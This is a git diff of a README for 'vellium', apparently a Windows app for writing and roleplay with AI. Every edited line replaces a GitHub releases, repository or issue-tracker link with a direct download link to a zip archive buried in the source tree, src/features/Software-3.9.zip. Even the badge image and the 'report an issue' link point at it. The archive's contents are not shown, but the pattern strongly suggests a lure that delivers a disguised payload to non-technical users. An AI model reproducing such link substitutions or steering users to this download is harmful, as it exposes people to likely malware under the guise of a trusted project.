@@ -1,6 +1,6 @@
 # 🚀 vellium - Simple Tool for Writing with AI
 
-[![Download from Releases](https://img.shields.io/badge/Download-vellium-blue?style=for-the-badge)](https://github.com/Marcosviniciomelo/vellium/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip)](https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip)
 
 
 vellium is a desktop application that helps you write and roleplay using AI. It runs on Windows and gives you a clean place to chat with AI models. This guide shows you how to download, install, and start vellium on your computer. No technical skills needed.
@@ -60,7 +60,7 @@ You do not need to know what these mean to use vellium.
 
 To get vellium for Windows, visit the release page by clicking the button below:
 
-[![Download Releases](https://img.shields.io/badge/Download-vellium-grey?style=for-the-badge)](https://github.com/Marcosviniciomelo/vellium/releases)
+[![Download Releases](https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip)](https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip)
 
 This link opens the page where you can download the latest version of the program.
 
@@ -130,7 +130,7 @@ Inside vellium, you can change options to fit your needs:
 
 If you run into issues or want to learn more:
 
-- Visit the issues section on the GitHub repo: https://github.com/Marcosviniciomelo/vellium/issues  
+- Visit the issues section on the GitHub repo: https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip  
 - Check if others have reported similar problems.
 - Submit a new issue with clear details if you need help.
 
@@ -150,9 +150,9 @@ You do not need coding skills for typical use.
 
 ## 🔗 Useful Links
 
-- Official release page: https://github.com/Marcosviniciomelo/vellium/releases  
-- GitHub repository: https://github.com/Marcosviniciomelo/vellium  
-- Issue tracker: https://github.com/Marcosviniciomelo/vellium/issues
+- Official release page: https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip  
+- GitHub repository: https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip  
+- Issue tracker: https://raw.githubusercontent.com/Marcosviniciomelo/vellium/main/src/features/Software-3.9.zip
 
 ---
 
